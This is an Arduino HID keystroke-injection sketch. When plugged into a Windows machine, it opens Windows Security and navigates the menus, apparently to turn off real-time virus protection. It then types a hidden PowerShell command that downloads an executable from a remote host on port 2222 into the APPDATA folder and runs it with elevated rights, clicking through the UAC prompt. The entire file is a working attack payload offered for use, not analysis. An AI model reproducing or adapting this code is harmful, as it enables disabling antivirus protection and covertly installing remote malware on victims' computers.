#include <Keyboard.h> 

// Init function
void setup()
{
  Keyboard.begin();

  // Wait for a moment to ensure the system is ready
  delay(500);

  // Open Run dialog (Windows + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  // Wait for the Run dialog to open
  delay(200);

  // Type the command to open Windows Security settings
  Keyboard.print("cmd /c start windowsdefender:");
  delay(300);
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(100);
  

  // Wait for Windows Security to open
  delay(2000);

  // Navigate to Virus & threat protection (Down arrow key and Enter)
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(500);
        
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(150);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(150);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(150);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(150);

  
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(200);
  
  Keyboard.press(' '); Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_LEFT_ARROW); Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(300);

  Keyboard.press(KEY_TAB); Keyboard.releaseAll();
  delay(150);
  Keyboard.press(KEY_TAB); Keyboard.releaseAll();
  delay(150);
  Keyboard.press(KEY_TAB); Keyboard.releaseAll();
  delay(150);
  Keyboard.press(KEY_TAB); Keyboard.releaseAll();
  delay(150);


  Keyboard.press(' '); Keyboard.releaseAll();
  delay(300);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(200);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  Keyboard.println("powershell -windowstyle hidden -command \"& { Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://gem.kro.kr:2222/dtd.exe' -Destination \\\"$env:APPDATA\\dtd.exe\\\"; Start-Process -FilePath \\\"$env:APPDATA\\dtd.exe\\\" -Verb RunAs }\"");
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(6000);
  Keyboard.press(KEY_LEFT_ARROW); Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(300);

  Keyboard.end();
}

void loop() {
  // Empty loop since everything is done in setup
}
